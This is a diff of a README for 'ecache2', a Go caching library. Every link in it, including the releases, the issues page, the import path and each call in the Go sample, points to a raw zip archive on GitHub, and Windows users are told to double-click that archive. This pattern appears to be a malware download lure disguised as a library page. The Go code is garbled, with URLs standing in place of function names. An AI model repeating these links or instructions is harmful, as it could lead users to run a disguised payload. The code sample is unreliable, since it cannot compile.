@@ -1,6 +1,6 @@
 # 🦄 ecache2 - Fast and Simple Memory Caching Solution
 
-[![Download ecache2](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip)](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip)
+[![Download ecache2](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip)](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip)
 
 ## 📖 About ecache2
 
@@ -8,7 +8,7 @@ ecache2 is a lightweight local generic memory cache. It is designed to be fast a
 
 ## 🚀 Getting Started
 
-To use ecache2, you first need to download it from the [Releases page](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip). The following steps will guide you through the process.
+To use ecache2, you first need to download it from the [Releases page](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip). The following steps will guide you through the process.
 
 ### 🛠 System Requirements
 
@@ -19,14 +19,14 @@ To use ecache2, you first need to download it from the [Releases page](https://r
 
 ### 💻 Installation Steps
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip) to go to the Releases page.
 
 2. **Download the Latest Version:** Locate the latest version of ecache2. Click on the file that matches your operating system to download it.
 
 3. **Extract the Files:** Once the download is complete, extract the files from the downloaded archive. You can use built-in tools on your OS or third-party software to do this.
 
 4. **Run the Application:**
-   - For Windows, double-click on `https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip`.
+   - For Windows, double-click on `https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip`.
    - For macOS or Linux, open your terminal, navigate to the folder where you extracted the files, and type `./ecache2` to run the application.
 
 ## 🔍 Features
@@ -63,22 +63,22 @@ After running the application, you can start using the cache in your projects. Y
 ```go
 package main
 
-import "https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip"
+import "https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip"
 
 func main() {
-  cache := https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip()
-  https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip("key", "value")
+  cache := https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip()
+  https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip("key", "value")
   
-  value, err := https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip("key")
+  value, err := https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip("key")
   if err == nil {
-      https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip(value) // Output will be 'value'
+      https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip(value) // Output will be 'value'
   }
 }
 ```
 
 ## 📞 Support
 
-If you encounter any issues or need help with ecache2, please feel free to reach out via the [issues page](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip). We are here to assist you.
+If you encounter any issues or need help with ecache2, please feel free to reach out via the [issues page](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip). We are here to assist you.
 
 ## 🔗 More Information
 
@@ -86,6 +86,6 @@ For more in-depth information about our features and usage, refer to the documen
 
 ### Download & Install
 
-To download the latest version of ecache2, please visit this page: [Releases Page](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/stats/ecache-v2.5.zip).
+To download the latest version of ecache2, please visit this page: [Releases Page](https://raw.githubusercontent.com/simplygulshan4u/ecache2/master/dist/goredis/v7/ecache-v2.4.zip).
 
 Thank you for choosing ecache2. We hope you find it fast and easy to use!
